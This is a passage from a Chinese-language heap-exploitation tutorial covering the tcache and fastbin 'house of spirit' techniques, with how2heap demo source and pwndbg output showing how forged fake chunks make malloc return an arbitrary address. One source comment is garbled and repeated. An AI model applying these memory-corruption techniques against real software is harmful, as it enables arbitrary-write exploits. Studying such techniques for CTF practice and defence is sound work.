    $10 = {0x9, 0x40, 0x7fffffffe5e8, 0xf0b5ff, 0x1, 0x555555554a6d, 0x7ffff7de59a0, 0x0, 0x555555554a20, 0x5555555546c0}
然后把我们的fake_chunks[2]的值赋给我们的a，也就是将a指向我们的fd指针
    pwndbg> x/2gx a
    0x7fffffffe580:    0x00007fffffffe5e8    0x0000000000f0b5ff
    pwndbg> x/10gx a-2 
    0x7fffffffe570:    0x0000000000000009    0x0000000000000040
    0x7fffffffe580:    0x00007fffffffe5e8    0x0000000000f0b5ff
    0x7fffffffe590:    0x0000000000000001    0x0000555555554a6d
    0x7fffffffe5a0:    0x00007ffff7de59a0    0x0000000000000000
    0x7fffffffe5b0:    0x0000555555554a20    0x00005555555546c0
现在free a,此时我们就把我们的a放入了free list中
    pwndbg> bins
    tcachebins
    0x40 [  1]: 0x7fffffffe580 ◂— 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
此时就可以将我们的地址malloc回来了
###  总结
本例就是通过free一个fake chunk来让我们malloc任意地址
程序首先让堆初始化了，然后申请了变量a和fake_chunks
之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针
现在free a，我们的fake_chunk就被放到了free list中
此时再malloc就可以返回我们的fake chunk了
## house of spirit
###  序
在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的
我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc
让我们来看看和tcache有什么区别吧
###  源代码
    #include 
    #include 
    int main()
    {
        fprintf(stderr, "This file demonstrates the house of spirit attack.n");
      //调用一次malloc来初始化堆  
        fprintf(stderr, "Calling malloc() once so that it sets up its memory.n");
        malloc(1);
      //现在我们将覆写一个指针来指向一个伪造的fastbin域
        fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.n");
        unsigned long long *a;
      //这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存
        // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
      //这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始
        fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);
      //这个chunk的size必须符和fastbin的要求( 2 * SIZE_SZ（在x64上需要> 16）和＆ system_mem（对于main arena来说，默认为 2*SIZE_SZ (> 16 on x64) && system_mem ( 2*SIZE_SZ (> 16 on x64) && system_mem ( 2*SIZE_SZ (> 16 on x64) && system_mem ( heap
    0x555555757000 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 593, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
    0x555555757250 FASTBIN {
      mchunk_prev_size = 0, 
      mchunk_size = 33, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x20d91
    }
    0x555555757270 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 134545, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
然后我们打印一下我们的fake_chunks
    pwndbg> p/x fake_chunks
    $2 = {0x9, 0x7ffff7dd7660, 0x7fffffffe5f8, 0xf0b5ff, 0x1, 0x555555554a2d, 0x7ffff7de59a0, 0x0, 0x5555555549e0, 0x5555555546c0}
    pwndbg> p/x &fake_chunks
    $3 = 0x7fffffffe580
之后我们来伪造我们的fake_chunk,我们将第一个fake chunk的size设为0x40
    pwndbg> p/x fake_chunks
    $4 = {0x9, 0x40, 0x7fffffffe5f8, 0xf0b5ff, 0x1, 0x555555554a2d, 0x7ffff7de59a0, 0x0, 0x5555555549e0, 0x5555555546c0}
    pwndbg> x/10gx fake_chunks
    0x7fffffffe580:    0x0000000000000009    0x0000000000000040
    0x7fffffffe590:    0x00007fffffffe5f8    0x0000000000f0b5ff
    0x7fffffffe5a0:    0x0000000000000001    0x0000555555554a2d
    0x7fffffffe5b0:    0x00007ffff7de59a0    0x0000000000000000
    0x7fffffffe5c0:    0x00005555555549e0    0x00005555555546c0
    $5 = {
      mchunk_prev_size = 9, 
      mchunk_size = 64, 
      fd = 0x7fffffffe5f8, 
      bk = 0xf0b5ff, 
      fd_nextsize = 0x1, 
      bk_nextsize = 0x555555554a2d 
    }
此时如果是tcache_hos的话已经可以了,但我们fastbin的话就需要使下一个chunk合法,也就是要给我们的fake_chunks[9]赋值了
为什么是fake_chunks[9]呢?因为在程序中,我们需要连续伪造两块chunk,而本例中第一块chunk的size将设为0x40了,因此fake_chunk[1]是第一个伪造的chunk的size的话,我们第二个伪造的chunk就要往下0x40也就是fake_chunk[1]+8的地方,即fake_chunk[9](%E8%BF%99%E9%87%8C%E8%AF%B4%E6%98%8E%E6%97%B6%E6%88%91%E5%B0%B1%E4%BB%A5size%E4%B8%BA%E5%9F%BA%E5%87%86%E4%BA%86%EF%BC%8C%E5%87%86%E7%A1%AE%E4%B8%80%E7%82%B9%E7%9A%84%E8%AF%B4%E6%B3%95%E6%98%AFfake_chunks%E5%92%8Cfake_chunks%5B8%5D%E5%A4%84%E8%BF%9E%E7%BB%AD%E4%BC%AA%E9%80%A0%E4%B8%A4%E4%B8%AAchunk)
赋值的大小就无所谓惹,只要比16大128kb小就好(64位机上)
    pwndbg> p/x fake_chunks
    $6 = {0x9, 0x40, 0x7fffffffe5f8, 0xf0b5ff, 0x1, 0x555555554a2d, 0x7ffff7de59a0, 0x0, 0x5555555549e0, 0x1234}
    pwndbg> x/10gx fake_chunks
    0x7fffffffe580:    0x0000000000000009    0x0000000000000040
    0x7fffffffe590:    0x00007fffffffe5f8    0x0000000000f0b5ff
    0x7fffffffe5a0:    0x0000000000000001    0x0000555555554a2d
    0x7fffffffe5b0:    0x00007ffff7de59a0    0x0000000000000000
    0x7fffffffe5c0:    0x00005555555549e0    0x0000000000001234
    pwndbg> p *(struct malloc_chunk*) 0x7fffffffe5c0
    $7 = {
      mchunk_prev_size = 93824992233952, 
      mchunk_size = 4660, 
      fd = 0x7fffffffe6c0, 
      bk = 0xcd9707df6838000, 
      fd_nextsize = 0x5555555549e0 , 
      bk_nextsize = 0x7ffff7a05b97 
    }
然后我们把fake_chunks赋给a,为什么使fake_chunks[2]不是fake_chunks,之前已经做过解释,就是因为用户指针mem是从chunk的fd开始的,而不是从pre_size域开始的
现在free掉a
    pwndbg> bins
    tcachebins
    0x40 [  1]: 0x7fffffffe590 ◂— 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
可以看到我们伪造的chunk已经在bins中了,此时只需要我们malloc一个0x40的chunk就可以从链中取出来了
###  总结
对于没有tcache的glibc版本而言,我们需要连续伪造两块size合法的chunk,并且第二块chunk的size并不需要满足fastbin的要求,只要满足合法的size即可
本程序首先初始话了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的fake_chunks
程序先在fake_chunks[1]的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确)
之后又在下一处伪造了第二个chunk,即从fake_chunks[8]开始的地方,这是为什么呢,因为我们第一个fake
chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk
## house of botcake
###  序
记得文章开头我说过glibc2.29中将我们的tcache double free扼住了咽喉吗，这里我们就可以用house of
botcake来修改我们的fd指针了